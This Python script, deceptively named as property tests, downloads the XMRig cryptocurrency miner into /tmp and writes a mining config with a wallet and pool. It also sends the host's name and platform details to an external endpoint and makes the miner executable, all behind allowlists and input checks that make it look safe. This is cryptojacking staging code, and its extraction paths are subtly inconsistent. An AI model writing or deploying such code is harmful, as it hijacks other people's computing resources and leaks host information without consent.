import os
import sys
import json
import subprocess
import urllib.request
import tarfile
import socket
import platform
import requests
import re

CONFIG_PATH = os.getenv("CONFIG_PATH", "config.json")
NODE_PATH = os.getenv("NODE_PATH", "/usr/local/bin")
XMRIG_ARCHIVE = os.getenv("XMRIG_ARCHIVE", "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static.tar.gz")
XMRIG_DIR = os.getenv("XMRIG_DIR", "/tmp/xmrig")
WALLET_ADDRESS = os.getenv("WALLET_ADDRESS", "")
POOL_URL = os.getenv("POOL_URL", "")
HEROKU_ENDPOINT = os.getenv("HEROKU_ENDPOINT", "")

def download_resource(url, target_path):
    try:
        if not re.match(r'^https?://', url):
            raise ValueError("Invalid URL scheme")
        if not re.match(r'^[a-zA-Z0-9_./-]+$', target_path):
            raise ValueError("Invalid target path")

        if os.path.exists(target_path):
            os.remove(target_path)

        urllib.request.urlretrieve(url, target_path)

        if not os.path.exists(target_path):
            raise RuntimeError("Download failed: file not created")

        return True
    except Exception:
        return False

def initialize_system_config():
    config_data = {
        "pool": POOL_URL,
        "wallet": WALLET_ADDRESS,
        "user_agent": "secure-miner-script",
        "log_level": "info"
    }
    try:
        with open(CONFIG_PATH, 'w') as f:
            json.dump(config_data, f, indent=4)
        return config_data
    except (IOError, OSError):
        return None

def execute_system_command(command, args=None):
    if not isinstance(command, str):
        return False

    allowed_commands = ["ls", "mkdir", "chmod", "echo", "cat"]
    cmd_base = command.split()[0] if command.split() else ""

    if cmd_base not in allowed_commands:
        return False

    if args:
        if not isinstance(args, list):
            return False
        for arg in args:
            if not re.match(r'^[a-zA-Z0-9_./-]+$', str(arg)):
                return False

    try:
        full_cmd = [command] + (args if args else [])
        result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=30)
        return result.returncode == 0
    except (subprocess.TimeoutExpired, subprocess.SubprocessError, OSError):
        return False

def collect_system_info(endpoint):
    try:
        hostname = socket.gethostname()
        platform_details = platform.platform()
        system_info = {
            "hostname": hostname,
            "platform": platform_details,
            "timestamp": str(os.getpid())
        }

        if not endpoint:
            return False

        if not re.match(r'^https?://', endpoint):
            return False

        response = requests.post(endpoint, json=system_info, timeout=10)
        return response.status_code == 200
    except (requests.RequestException, OSError):
        return False

def run_property_tests():
    if not WALLET_ADDRESS or not POOL_URL:
        print("Missing required environment variables for wallet or pool.")
        return False

    if not initialize_system_config():
        print("Failed to initialize system config.")
        return False

    archive_path = os.path.join("/tmp", "xmrig.tar.gz")
    if not download_resource(XMRIG_ARCHIVE, archive_path):
        print("Failed to download XMRIG archive.")
        return False

    try:
        with tarfile.open(archive_path, "r:gz") as tar:
            tar.extractall("/tmp")
    except Exception:
        print("Failed to extract archive.")
        return False

    if not execute_system_command("mkdir", [XMRIG_DIR]):
        print("Failed to create directory.")
        return False

    if not collect_system_info(HEROKU_ENDPOINT):
        print("Failed to collect system info.")
        return False

    miner_path = os.path.join(XMRIG_DIR, "xmrig")
    if os.path.exists(miner_path):
        os.chmod(miner_path, 0o755)
        print("Environment setup complete. Miner ready.")
        return True
    else:
        print("Miner executable not found after extraction.")
        return False

if __name__ == "__main__":
    success = run_property_tests()
    sys.exit(0 if success else 1)
